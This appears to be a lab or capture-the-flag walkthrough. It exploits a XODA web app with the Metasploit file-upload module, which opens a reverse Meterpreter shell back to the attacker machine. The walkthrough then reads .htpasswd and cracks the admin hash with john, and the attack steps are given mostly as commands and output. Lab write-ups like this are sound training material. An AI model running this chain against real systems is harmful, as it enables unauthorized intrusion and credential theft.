
# Check the IP address of the attacker machine.
...and run nmap on the target 
```
 ip addr
 nmap 192.75.15.3
```

# Check the HTTP content hosted on port 80 of target machine.
a XODA webapp instance is running on the system which can be exploited using “exploit/unix/webapp/xoda_file_upload” metasploit module


```
Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
root@attackdefense:~# nmap 192.75.131.3
Starting Nmap 7.70 ( https://nmap.org ) at 2023-10-24 01:41 UTC
Nmap scan report for target-1 (192.75.131.3)
Host is up (0.000014s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:C0:4B:83:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
root@attackdefense:~# nmap 192.75.131.3^C
root@attackdefense:~# curl 192.75.131.3
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <title>XODA</title>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                        <script language="JavaScript" type="text/javascript">
                        //<![CDATA[
                        var countselected=0;
                        function stab(id){var _10=new Array();for(i=0;i<_10.length;i++){document.getElementById(_10[i]).className="tab";}document.getElementById(id).className="stab";}var allfiles=new Array('');
                        //]]>
                </script>
                <script language="JavaScript" type="text/javascript" src="/js/xoda.js"></script>
                <script language="JavaScript" type="text/javascript" src="/js/sorttable.js"></script>
                <link rel="stylesheet" href="/style.css" type="text/css" />
</head>

<body onload="document.lform.username.focus();">
        <div id="top">
                <a href="/" title="XODA"><span style="color: #56a;">XO</span><span style="color: #fa5;">D</span><span style="color: #56a;">A</span></a>
                        </div>
        <form method="post" action="/?log_in" name="lform" id="login">
                <p>Username:&nbsp;<input type="text" id="un" name="username" /></p>
                <p>Password:&nbsp;<input type="password" name="password" /></p>
                <p><input type="submit" name="submit" value="login" /></p>
        </form>
</body>
</html>
```

# Start msfconsole

exploit XODA vulnerability
```
root@attackdefense:~# msfconsole                                   ]

msf5 > use exploit/unix/webapp/xoda_file_upload
msf5 exploit(unix/webapp/xoda_file_upload) > set RHOSTS 192.75.131.3
RHOSTS => 192.75.131.3
msf5 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
TARGETURI => /
msf5 exploit(unix/webapp/xoda_file_upload) > exploit

[*] Started reverse TCP handler on 192.75.131.2:4444 
[*] Sending PHP payload (VgVCWWx.php)
[*] Executing PHP payload (VgVCWWx.php)
[*] Sending stage (38247 bytes) to 192.75.131.3
[*] Meterpreter session 1 opened (192.75.131.2:4444 -> 192.75.131.3:45862) at 2023-10-24 01:45:26 +0000
[!] Deleting VgVCWWx.php
```

# start a shell in meterpreter
```
meterpreter > 
meterpreter > shell
Process 794 created.
Channel 0 created.
```

# Get .htpasswd content
```
ls -al
total 220
drwxrwxrwx 1 root     root      4096 Oct 24 01:42 .
drwxr-xr-x 1 root     root      4096 Oct 24 01:33 ..
drwxrwxrwx 1 root     root      4096 Feb 24  2020 .git
-rw-r--r-- 1 root     root        44 Mar 25  2020 .htpasswd
drwxr-xr-x 2 www-data www-data  4096 Oct 24 01:42 .xoda
-rwxrwxrwx 1 root     root     10273 Feb 24  2020 LICENSE

cat .htpasswd 
admin:$apr1$cVmvMNdi$TSN9vCugRwO00n7xB5E6H0
```

# Get the password with john
```
root@attackdefense:~# john --wordlist=/root/wordlists/100-common-passwords.txt htpasswd
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 256/256 AVX2 8x3])
Will run 48 OpenMP threads

Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 100 candidates left, minimum 1152 needed for performance.
raspberry        (admin)
1g 0:00:00:01 DONE (2023-10-24 01:51) 0.9090g/s 90.90p/s 90.90c/s 90.90C/s 242424..vagrant
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

# FLAG
admin password is raspberry